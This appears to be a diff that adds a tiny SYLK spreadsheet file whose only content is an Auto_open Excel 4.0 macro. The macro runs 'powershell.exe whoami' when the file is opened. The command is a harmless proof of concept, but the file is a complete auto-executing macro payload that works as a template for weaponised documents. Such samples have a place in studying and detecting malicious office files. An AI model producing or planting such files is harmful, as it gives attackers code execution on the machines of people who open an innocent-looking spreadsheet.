@@ -1,0 +1,7 @@
+ID;P
+O;E
+NN;NAuto_open
+C;X1;Y1;K1;EEXEC("powershell.exe whoami")
+C;X1;Y1;K0;EHALT()
+E
+
